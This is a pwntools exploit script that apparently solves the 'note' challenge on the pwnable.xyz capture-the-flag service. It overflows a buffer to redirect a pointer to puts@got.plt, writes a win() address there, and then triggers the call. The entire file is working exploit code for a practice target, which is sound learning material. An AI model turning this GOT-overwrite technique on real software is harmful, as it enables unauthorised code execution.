#!/usr/bin/env python3
from pwn import *
import sys, pwnlib, struct

pwnlib.args.SILENT(True)
BINPATH = './note'
HOST = 'svc.pwnable.xyz'
PORT = 30016

def main(argc, argv):
    modes = ['local', 'remote']
    if(argc < 2):
        return 0
    mode = argv[1].lower()
    if(mode not in modes):
        return 0

    p = process(BINPATH) if mode == modes[0] else remote(HOST, PORT)
    death = p.kill if mode == modes[0] else p.close

    win_func = struct.pack('<Q', 0x0040093c)
    puts_gotplt = struct.pack('<Q', 0x601220)

    p.recvline()
    # Overwrite description pointer with the value of puts@got.plt
    p.recvuntil(b'> ')
    p.send(b'1\n')
    p.recvuntil(b'? ')
    p.send(b'40\n')
    p.recvuntil(b': ')
    p.send(b'\xef\xbe\xad\xde'*8+puts_gotplt)

    # Overwrite address of puts() stored at puts@got.plt
    p.recvuntil(b'> ')
    p.send(b'2\n')
    p.recvuntil(b': ')
    p.send(win_func+b'\n')

    # Call win()
    p.recvuntil(b'> ')
    p.send(b'5\n')
    print(p.recv().decode())
    

    death()
    return 0

if(__name__=='__main__'):
    try:
        exit(main(len(sys.argv), sys.argv))
    except KeyboardInterrupt:
        exit(130)